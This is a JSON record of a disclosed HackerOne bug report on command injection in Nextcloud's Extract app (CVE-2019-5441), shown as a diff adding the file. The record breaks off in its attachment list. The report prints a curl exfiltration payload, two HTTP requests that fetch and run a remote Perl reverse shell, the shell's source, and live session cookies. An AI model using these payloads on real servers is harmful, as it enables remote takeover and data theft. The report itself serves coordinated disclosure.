@@ -1,0 +1,195 @@
+{
+  "id": 546753,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81NDY3NTM=",
+  "url": "https://hackerone.com/reports/546753",
+  "title": "Remote Code Execution via Extract App Plugin",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2019-04-23T09:09:35.695Z",
+  "submitted_at": "2019-04-23T09:09:35.695Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "hdbreaker",
+    "url": "/hdbreaker",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/143/746/8bf5b1b62978a280a2b665df3745f0a2372c2989_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13291,
+    "url": "https://hackerone.com/nextcloud",
+    "handle": "nextcloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/hsgut1vi1cv8housqai9cm9383yx/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/hsgut1vi1cv8housqai9cm9383yx/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Nextcloud",
+      "twitter_handle": "nextclouders",
+      "website": "https://nextcloud.com",
+      "about": "Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2019-5441"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2019-05-30T07:17:04.686Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2019-04-30T07:17:00.291Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi, I found a critical issue in the Add-on \"Extract\" listed in the Nextcloud Marketplace: https://apps.nextcloud.com/apps/extract (This extension can be installed directly from Nextcloud Application)\n\nThe vulnerability was found in file: extract/lib/Controller/ExtractionController.php line 102.\n\nThe affected code can be seen below:\n\n```\nif (extension_loaded (\"rar\")){\n\t\t\t\t$rar_file = rar_open($file);\n\t\t\t\t$list = rar_list($rar_file);\n\t\t\t\tvar_dump($rar_file);\n\t\t\t\tforeach($list as $fileOpen) {\n\t\t\t\t\t$entry = rar_entry_get($rar_file, $fileOpen->getName());\n\t\t\t\t\t$entry->extract($dir); // extract to the current dir\n\t\t\t\t\tself::scanFolder('/'.$this->UserId.'/files'.$directory.'/'.$fileOpen->getName());\n\t\t\t\t}\n\t\t\t\trar_close($rar_file); \n\t\t\t}else{\n                ######## BUG HERE #########\n\t\t\t\texec(\"unrar x \\\"\".$file.\"\\\" -R \\\"\".$dir.\"\\\" -o+\",$output,$return);\n                #########################\n\t\t\t\tforeach ($output as $val ) {\n\t\t\t\t\tif(preg_split('/ /', $val, -1, PREG_SPLIT_NO_EMPTY)[0] == \"Extracting\" && \n\t\t\t\t\tpreg_split('/ /', $val, -1, PREG_SPLIT_NO_EMPTY)[1] != \"from\"){\n\t\t\t\t\t\t$fichier = substr(strrchr($PATH, \"/\"), 1);\n\t\t\t\t\t\tself::scanFolder('/'.$this->UserId.'/files'.$directory.'/'.$fichier);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n```\n\nThe unrar line allows Command Injection via $file and $dir parameters, an attacker could use the following payload in order to exploit a Remote Command Execution in a Nextcloud Server and exfiltrate data via Curl requests.\n\n```\nnameOfFile=sample.rar\"|curl www.attacker.com:443/data?id=$(id | base64)|\"&directory=&external=0\n```\n\nAbusing this issue I was able to take full control of the demo instance: https://demo.nextcloud.com/lun0shai/\n\nThe steps to reproduce this PoC can be seen below:\n\n1) Create a demo instance in https://demo.nextcloud.com and login.\n2) Install the plugin Extract directly from the Apps menu:\n\n{F474350}\n\n3) Once the Add-on is installed, the attacker needs to upload a sample.rar file:\n\n{F474351}\n\n4) Then, the attacker needs to use the functionality \"Extract Here\" from the context menu and intercept the HTTP Request with BurpSuite:\n\n{F474352}\n\nBurp Interceptor:\n{F474356}\n\n5) At this point, the attacker can manipulate the $nameOfFile and & $dir parameters to achieve Remote Code Execution in the Nextcloud Instance. This PoC of RCE was performed over a Demo Instance running the latest version of NextClou.\n\nTo achieve RCE over Demo Instance 2 payloads were needed:\n\na) The attacker needs to force the application to download a Perl Reverse Shell to /tmp folder using curl, this was achieved using the following HTTP Request:\n\nNote: \nMy server IP is: 138.68.1.244\n\nHTTP Request:\n```\nPOST /lun0shai/index.php/apps/extract/ajax/extractRar.php HTTP/1.1\nHost: demo.nextcloud.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nrequesttoken: v+/28PW5/gilVA9we7iR7yrAYLjQCiYpfyx4e+jIdPU=:24ODl5qN0WLLN14xF+vgrEC0EM/ifB55OxU1SIe+LcE=\nOCS-APIREQUEST: true\nX-Requested-With: XMLHttpRequest\nContent-Length: 98\nConnection: close\nCookie: oco9fwvj7vid=aashsh75p508m9qk0tdq0ahk8v; oc_sessionPassphrase=XmIYyFzOLH1JtcvmdyZ6JbO67Sh1lbdC6UlHe0FkyVXeu5e2gA%2FOloJaUrRkXAb8sDLgF2pQYpUh1NlHeS8rpppQZakBiTH3K9%2FwWAytej%2FCTkV9%2FurYyRaMVQWLbAyu; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true; nc_username=admin; nc_token=eGciTpRb4Bu7DpG2ohUjUWhAd%2BjQGRbb; nc_session_id=aashsh75p508m9qk0tdq0ahk8v\n\nnameOfFile=sample.rar\"|curl http://138.68.1.244/shell.pl -o /tmp/shell2.pl|\"&directory=&external=0\n```\n\nHTTP Response:\n```\nHTTP/1.1 200 OK\nDate: Tue, 23 Apr 2019 08:24:50 GMT\nServer: Apache\nStrict-Transport-Security: max-age=15768000\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nCache-Control: no-cache, no-store, must-revalidate\nPragma: no-cache\nContent-Security-Policy: default-src 'none';base-uri 'none';manifest-src 'self';script-src 'nonce-bXBVNko3dWtWZnFVMzl3QnpTMHBlSkwvYlhhSWtLczZXelhlTFRkMGNJdz06L3ZsUFFOU1FlcEQ2dkkxQW9YNVlPL2lMSFFHNjVwTnFId3lUSGxnQ0tiZz0=';style-src 'self' 'unsafe-inline';img-src 'self' data: blob:;font-src 'self' data:;connect-src 'self' stun.nextcloud.com:443;media-src 'self';frame-src https://demo.nextcloud.com\nX-Frame-Options: SAMEORIGIN\nContent-Length: 4\nX-Content-Type-Options: nosniff\nX-XSS-Protection: 1; mode=block\nX-Robots-Tag: none\nX-Download-Options: noopen\nX-Permitted-Cross-Domain-Policies: none\nReferrer-Policy: no-referrer\nContent-Type: application/json; charset=utf-8\nConnection: close\n\nnull\n```\n\nThe above request wrote the following reverse shell in /tmp/shell.pl\n```\nuse Socket;$i=\"138.68.1.244\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}\n```\n\n(At this point a Netcat Listener was running on my Server)\n{F474360}\n\nb) A second HTTP Request was needed to execute the Perl Reverse Shell and gain full shell access over the remote server (demo.nextcloud.com):\n\nHTTP Request:\n```\nPOST /lun0shai/index.php/apps/extract/ajax/extractRar.php HTTP/1.1\nHost: demo.nextcloud.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nrequesttoken: v+/28PW5/gilVA9we7iR7yrAYLjQCiYpfyx4e+jIdPU=:24ODl5qN0WLLN14xF+vgrEC0EM/ifB55OxU1SIe+LcE=\nOCS-APIREQUEST: true\nX-Requested-With: XMLHttpRequest\nContent-Length: 66\nConnection: close\nCookie: oco9fwvj7vid=aashsh75p508m9qk0tdq0ahk8v; oc_sessionPassphrase=XmIYyFzOLH1JtcvmdyZ6JbO67Sh1lbdC6UlHe0FkyVXeu5e2gA%2FOloJaUrRkXAb8sDLgF2pQYpUh1NlHeS8rpppQZakBiTH3K9%2FwWAytej%2FCTkV9%2FurYyRaMVQWLbAyu; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true; nc_username=admin; nc_token=eGciTpRb4Bu7DpG2ohUjUWhAd%2BjQGRbb; nc_session_id=aashsh75p508m9qk0tdq0ahk8v\n\nnameOfFile=sample.rar\"|perl /tmp/shell2.pl|\"&directory=&external=0\n```\n\nAfter these steps, my Server (IP: 138.68.1.244) received the Reverse Shell successfully and I was able to move freely over the Docker Instance of Nextcloud, reading even the config file as can be seen below:\n\nAn inbound connection from demo.nextcloud.com was received\n{F474361}\n\nContent of /config/config.php\n{F474362}\n\nHope this could help to improve your security and check continuously the Applications that you spread using your market.\n\nPlease do not hesitate to contact me if you need any help to detect/resolve this issue.\n\nRegards,\n\n## Impact\n\nAn authenticated user could use the Extract Plugin listed in the Apps Market of Nextcloud to achieve Remote Code Execution in any Nextcloud instance.",
+  "weakness": {
+    "id": 59,
+    "name": "OS Command Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 474350,
+      "file_name": "Screen_Shot_2019-04-23_at_5.41.35_AM.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/474/350/2c5d874ad557e1c8b8d35ac75ef5f190eb76dbaf/Screen_Shot_2019-04-23_at_5.41.35_AM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2019-04-23_at_5.41.35_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2019-04-23_at_5.41.35_AM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7FSCVMF7%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152221Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJHMEUCIQDUthnfJs9BDdavfKxuzlWyn92EPuL%2Br7WHazAoqfxapAIgA4Uo6vD2ROnHy3IkcdAQOVqIGOVW3I5S0vc0IKPK4nkqugUI6P%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDAGnIHavIhntGQBMqyqOBeT43CfYMGcNPBYettkzOa616QbsPUWnOPBL9RbcApgC7pQSfY%2FZmkrHoRQok80HEfAHc2xdAGyB%2BZ3U0bc69S5C6jdUrUE%2BSsS6JTmfvVcIH1I8tm1K2%2FBvmHLJ5humAE80puAaaxQHIAAkY6K5yFquTCUvNw9RJYxVkcZW2t4GjYV7wu2FT94s6yFdILWtG9CI%2BXKfWrlgyrKaqtivvJvMtgJplTzuXnO5ZEe3Fp9MrP1zcFTiqipG3C3PIyxRWEct%2B5jhCJk12UgjGsg6fqRBeLNEfQt7XCx6B6MlJFVKUf1rH%2Fufa3NqrngZ1F%2FI9oHxlf1%2B5H%2B5XtyGUMTzD0JtcZTH8lMqu8yaSFVCh0NqZTxZ4E4uibqZQrLMlZAbxStkujtYL8i7BXkzMzrOemVrkjCdfEtREnDdikIGxh4jPHaGuTkRNp%2B%2Fl6%2Fz1TsKvK43PyGT6f%2BF9a2HDKRQuZzPTOVC7g4YC06zhXVGSOgXfsd%2FDW%2BRITCHC99GPNTUsCPSiPhReT6uf92JWnpfDh8Ne3oYonoCjDjo58aCW12uqY5h7wuW9N29CO2dfBSD1hr983r6Ie2vVU16jcYptxsvKojDNv1JKIO%2FXompKnNzwnUFrbFm2bbEcTwP%2BrG6k2VZ9wL8w8%2FDi1cD19dqULREUjIl%2FcC02spFRUC7Hc%2FGtH7%2Bllbp7OF8VZQe3T42RHhMefzSD6pMiHDCdy7U8ppsVbVHffQUku%2FfEULDn4ZL0U%2FcHj1Nx93DLXyYIJcoCvgojCD2ILJNSkgVwrDK1DZTmb5P0PxDZvRe2Z%2Bvf0KdFAcSi3PkqadLqGK1vOcanSkOri85l%2FCc63GVnTKkb0tOD0hQ2u78YplFWoCEmDC4mv3PBjqxAY%2FT2y1qy2P8JMynQruhIqTciGfXEMg8lAtWEmEO4naOO2%2FKuOmK38iS4fJGDkv4nkp0c%2FXYmWw0121MiHkfGJIT1M19p3eLc3C%2BbuG6c1VN6NSrpCRfVVR8OCQTBg8c4Ql6rQ%2BCN7NPW2w5cUFORL4Gw4G90xx2owGK1ErKsRTRnzBIhP43WBMwNISVz4XJ8Tb5WJiK854spf9fv%2FlQEtWnEENXEd7YCxNPHDvOLn%2FXOw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=277eebe96a44e27fa6d86cba6b015de3545db1e1065384491c3093524a480a48",
+      "file_size": 413072,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 474351,
+      "file_name": "Screen_Shot_2019-04-23_at_5.43.18_AM.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/474/351/9b64b8f2c765b6a540d7ea3557dc728bbfe37659/Screen_Shot_2019-04-23_at_5.43.18_AM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2019-04-23_at_5.43.18_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2019-04-23_at_5.43.18_AM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7FSCVMF7%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152221Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJHMEUCIQDUthnfJs9BDdavfKxuzlWyn92EPuL%2Br7WHazAoqfxapAIgA4Uo6vD2ROnHy3IkcdAQOVqIGOVW3I5S0vc0IKPK4nkqugUI6P%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDAGnIHavIhntGQBMqyqOBeT43CfYMGcNPBYettkzOa616QbsPUWnOPBL9RbcApgC7pQSfY%2FZmkrHoRQok80HEfAHc2xdAGyB%2BZ3U0bc69S5C6jdUrUE%2BSsS6JTmfvVcIH1I8tm1K2%2FBvmHLJ5humAE80puAaaxQHIAAkY6K5yFquTCUvNw9RJYxVkcZW2t4GjYV7wu2FT94s6yFdILWtG9CI%2BXKfWrlgyrKaqtivvJvMtgJplTzuXnO5ZEe3Fp9MrP1zcFTiqipG3C3PIyxRWEct%2B5jhCJk12UgjGsg6fqRBeLNEfQt7XCx6B6MlJFVKUf1rH%2Fufa3NqrngZ1F%2FI9oHxlf1%2B5H%2B5XtyGUMTzD0JtcZTH8lMqu8yaSFVCh0NqZTxZ4E4uibqZQrLMlZAbxStkujtYL8i7BXkzMzrOemVrkjCdfEtREnDdikIGxh4jPHaGuTkRNp%2B%2Fl6%2Fz1TsKvK43PyGT6f%2BF9a2HDKRQuZzPTOVC7g4YC06zhXVGSOgXfsd%2FDW%2BRITCHC99GPNTUsCPSiPhReT6uf92JWnpfDh8Ne3oYonoCjDjo58aCW12uqY5h7wuW9N29CO2dfBSD1hr983r6Ie2vVU16jcYptxsvKojDNv1JKIO%2FXompKnNzwnUFrbFm2bbEcTwP%2BrG6k2VZ9wL8w8%2FDi1cD19dqULREUjIl%2FcC02spFRUC7Hc%2FGtH7%2Bllbp7OF8VZQe3T42RHhMefzSD6pMiHDCdy7U8ppsVbVHffQUku%2FfEULDn4ZL0U%2FcHj1Nx93DLXyYIJcoCvgojCD2ILJNSkgVwrDK1DZTmb5P0PxDZvRe2Z%2Bvf0KdFAcSi3PkqadLqGK1vOcanSkOri85l%2FCc63GVnTKkb0tOD0hQ2u78YplFWoCEmDC4mv3PBjqxAY%2FT2y1qy2P8JMynQruhIqTciGfXEMg8lAtWEmEO4naOO2%2FKuOmK38iS4fJGDkv4nkp0c%2FXYmWw0121MiHkfGJIT1M19p3eLc3C%2BbuG6c1VN6NSrpCRfVVR8OCQTBg8c4Ql6rQ%2BCN7NPW2w5cUFORL4Gw4G90xx2owGK1ErKsRTRnzBIhP43WBMwNISVz4XJ8Tb5WJiK854spf9fv%2FlQEtWnEENXEd7YCxNPHDvOLn%2FXOw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a3a3188cc40c30c6c17a09f90e178387f103b074232be5fde737d51ca91fdd08",
+      "file_size": 193560,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 474352,
+      "file_name": "Screen_Shot_2019-04-23_at_5.43.39_AM.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/474/352/47328d1a2e61d31a4535f6d93fcbe8dfac5919bf/Screen_Shot_2019-04-23_at_5.43.39_AM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2019-04-23_at_5.43.39_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2019-04-23_at_5.43.39_AM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7FSCVMF7%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152221Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJHMEUCIQDUthnfJs9BDdavfKxuzlWyn92EPuL%2Br7WHazAoqfxapAIgA4Uo6vD2ROnHy3IkcdAQOVqIGOVW3I5S0vc0IKPK4nkqugUI6P%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDAGnIHavIhntGQBMqyqOBeT43CfYMGcNPBYettkzOa616QbsPUWnOPBL9RbcApgC7pQSfY%2FZmkrHoRQok80HEfAHc2xdAGyB%2BZ3U0bc69S5C6jdUrUE%2BSsS6JTmfvVcIH1I8tm1K2%2FBvmHLJ5humAE80puAaaxQHIAAkY6K5yFquTCUvNw9RJYxVkcZW2t4GjYV7wu2FT94s6yFdILWtG9CI%2BXKfWrlgyrKaqtivvJvMtgJplTzuXnO5ZEe3Fp9MrP1zcFTiqipG3C3PIyxRWEct%2B5jhCJk12UgjGsg6fqRBeLNEfQt7XCx6B6MlJFVKUf1rH%2Fufa3NqrngZ1F%2FI9oHxlf1%2B5H%2B5XtyGUMTzD0JtcZTH8lMqu8yaSFVCh0NqZTxZ4E4uibqZQrLMlZAbxStkujtYL8i7BXkzMzrOemVrkjCdfEtREnDdikIGxh4jPHaGuTkRNp%2B%2Fl6%2Fz1TsKvK43PyGT6f%2BF9a2HDKRQuZzPTOVC7g4YC06zhXVGSOgXfsd%2FDW%2BRITCHC99GPNTUsCPSiPhReT6uf92JWnpfDh8Ne3oYonoCjDjo58aCW12uqY5h7wuW9N29CO2dfBSD1hr983r6Ie2vVU16jcYptxsvKojDNv1JKIO%2FXompKnNzwnUFrbFm2bbEcTwP%2BrG6k2VZ9wL8w8%2FDi1cD19dqULREUjIl%2FcC02spFRUC7Hc%2FGtH7%2Bllbp7OF8VZQe3T42RHhMefzSD6pMiHDCdy7U8ppsVbVHffQUku%2FfEULDn4ZL0U%2FcHj1Nx93DLXyYIJcoCvgojCD2ILJNSkgVwrDK1DZTmb5P0PxDZvRe2Z%2Bvf0KdFAcSi3PkqadLqGK1vOcanSkOri85l%2FCc63GVnTKkb0tOD0hQ2u78YplFWoCEmDC4mv3PBjqxAY%2FT2y1qy2P8JMynQruhIqTciGfXEMg8lAtWEmEO4naOO2%2FKuOmK38iS4fJGDkv4nkp0c%2FXYmWw0121MiHkfGJIT1M19p3eLc3C%2BbuG6c1VN6NSrpCRfVVR8OCQTBg8c4Ql6rQ%2BCN7NPW2w5cUFORL4Gw4G90xx2owGK1ErKsRTRnzBIhP43WBMwNISVz4XJ8Tb5WJiK854spf9fv%2FlQEtWnEENXEd7YCxNPHDvOLn%2FXOw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a574ab1c674c168307172f726463f3ba408ea974cd66774160d984637ea8d32c",
+      "file_size": 87930,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 474356,
+      "file_name": "Screen_Shot_2019-04-23_at_5.47.40_AM.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/474/356/1eae964f28b69f1c16a8858bbc6de99a3a575a5c/Screen_Shot_2019-04-23_at_5.47.40_AM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2019-04-23_at_5.47.40_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2019-04-23_at_5.47.40_AM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7FSCVMF7%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152221Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJHMEUCIQDUthnfJs9BDdavfKxuzlWyn92EPuL%2Br7WHazAoqfxapAIgA4Uo6vD2ROnHy3IkcdAQOVqIGOVW3I5S0vc0IKPK4nkqugUI6P%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDAGnIHavIhntGQBMqyqOBeT43CfYMGcNPBYettkzOa616QbsPUWnOPBL9RbcApgC7pQSfY%2FZmkrHoRQok80HEfAHc2xdAGyB%2BZ3U0bc69S5C6jdUrUE%2BSsS6JTmfvVcIH1I8tm1K2%2FBvmHLJ5humAE80puAaaxQHIAAkY6K5yFquTCUvNw9RJYxVkcZW2t4GjYV7wu2FT94s6yFdILWtG9CI%2BXKfWrlgyrKaqtivvJvMtgJplTzuXnO5ZEe3Fp9MrP1zcFTiqipG3C3PIyxRWEct%2B5jhCJk12UgjGsg6fqRBeLNEfQt7XCx6B6MlJFVKUf1rH%2Fufa3NqrngZ1F%2FI9oHxlf1%2B5H%2B5XtyGUMTzD0JtcZTH8lMqu8yaSFVCh0NqZTxZ4E4uibqZQrLMlZAbxStkujtYL8i7BXkzMzrOemVrkjCdfEtREnDdikIGxh4jPHaGuTkRNp%2B%2Fl6%2Fz1TsKvK43PyGT6f%2BF9a2HDKRQuZzPTOVC7g4YC06zhXVGSOgXfsd%2FDW%2BRITCHC99GPNTUsCPSiPhReT6uf92JWnpfDh8Ne3oYonoCjDjo58aCW12uqY5h7wuW9N29CO2dfBSD1hr983r6Ie2vVU16jcYptxsvKojDNv1JKIO%2FXompKnNzwnUFrbFm2bbEcTwP%2BrG6k2VZ9wL8w8%2FDi1cD19dqULREUjIl%2FcC02spFRUC7Hc%2FGtH7%2Bllbp7OF8VZQe3T42RHhMefzSD6pMiHDCdy7U8ppsVbVHffQUku%2FfEULDn4ZL0U%2FcHj1Nx93DLXyYIJcoCvgojCD2ILJNSkgVwrDK1DZTmb5P0PxDZvRe2Z%2Bvf0KdFAcSi3PkqadLqGK1vOcanSkOri85l%2FCc63GVnTKkb0tOD0hQ2u78YplFWoCEmDC4mv3PBjqxAY%2FT2y1qy2P8JMynQruhIqTciGfXEMg8lAtWEmEO4naOO2%2FKuOmK38iS4fJGDkv4nkp0c%2FXYmWw0121MiHkfGJIT1M19p3eLc3C%2BbuG6c1VN6NSrpCRfVVR8OCQTBg8c4Ql6rQ%2BCN7NPW2w5cUFORL4Gw4G90xx2owGK1ErKsRTRnzBIhP43WBMwNISVz4XJ8Tb5WJiK854spf9fv%2FlQEtWnEENXEd7YCxNPHDvOLn%2FXOw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=456fa121d93d839cfcef41b9523d8324cbf5fdfe145b64598ec48fb88ceb6e60",
+      "file_size": 200317,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 474360,
+      "file_name": "Screen_Shot_2019-04-23_at_5.51.48_AM.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/474/360/e3602b08d1c769e8390eb9dabf85b6cc9bc5433c/Screen_Shot_2019-04-23_at_5.51.48_AM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2019-04-23_at_5.51.48_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2019-04-23_at_5.51.48_AM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7FSCVMF7%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152221Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJHMEUCIQDUthnfJs9BDdavfKxuzlWyn92EPuL%2Br7WHazAoqfxapAIgA4Uo6vD2ROnHy3IkcdAQOVqIGOVW3I5S0vc0IKPK4nkqugUI6P%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDAGnIHavIhntGQBMqyqOBeT43CfYMGcNPBYettkzOa616QbsPUWnOPBL9RbcApgC7pQSfY%2FZmkrHoRQok80HEfAHc2xdAGyB%2BZ3U0bc69S5C6jdUrUE%2BSsS6JTmfvVcIH1I8tm1K2%2FBvmHLJ5humAE80puAaaxQHIAAkY6K5yFquTCUvNw9RJYxVkcZW2t4GjYV7wu2FT94s6yFdILWtG9CI%2BXKfWrlgyrKaqtivvJvMtgJplTzuXnO5ZEe3Fp9MrP1zcFTiqipG3C3PIyxRWEct%2B5jhCJk12UgjGsg6fqRBeLNEfQt7XCx6B6MlJFVKUf1rH%2Fufa3NqrngZ1F%2FI9oHxlf1%2B5H%2B5XtyGUMTzD0JtcZTH8lMqu8yaSFVCh0NqZTxZ4E4uibqZQrLMlZAbxStkujtYL8i7BXkzMzrOemVrkjCdfEtREnDdikIGxh4jPHaGuTkRNp%2B%2Fl6%2Fz1TsKvK43PyGT6f%2BF9a2HDKRQuZzPTOVC7g4YC06zhXVGSOgXfsd%2FDW%2BRITCHC99GPNTUsCPSiPhReT6uf92JWnpfDh8Ne3oYonoCjDjo58aCW12uqY5h7wuW9N29CO2dfBSD1hr983r6Ie2vVU16jcYptxsvKojDNv1JKIO%2FXompKnNzwnUFrbFm2bbEcTwP%2BrG6k2VZ9wL8w8%2FDi1cD19dqULREUjIl%2FcC02spFRUC7Hc%2FGtH7%2Bllbp7OF8VZQe3T42RHhMefzSD6pMiHDCdy7U8ppsVbVHffQUku%2FfEULDn4ZL0U%2FcHj1Nx93DLXyYIJcoCvgojCD2ILJNSkgVwrDK1DZTmb5P0PxDZvRe2Z%2Bvf0KdFAcSi3PkqadLqGK1vOcanSkOri85l%2FCc63GVnTKkb0tOD0hQ2u78YplFWoCEmDC4mv3PBjqxAY%2FT2y1qy2P8JMynQruhIqTciGfXEMg8lAtWEmEO4naOO2%2FKuOmK38iS4fJGDkv4nkp0c%2FXYmWw0121MiHkfGJIT1M19p3eLc3C%2BbuG6c1VN6NSrpCRfVVR8OCQTBg8c4Ql6rQ%2BCN7NPW2w5cUFORL4Gw4G90xx2owGK1ErKsRTRnzBIhP43WBMwNISVz4XJ8Tb5WJiK854spf9fv%2FlQEtWnEENXEd7YCxNPHDvOLn%2FXOw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=216ef6f6cdea548f79dc2fb4e19e07e5dc9c43df0a213950dbc76dcd8f98b733",
+      "file_size": 45173,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 474361,
+      "file_name": "Screen_Shot_2019-04-23_at_5.54.31_AM.png",
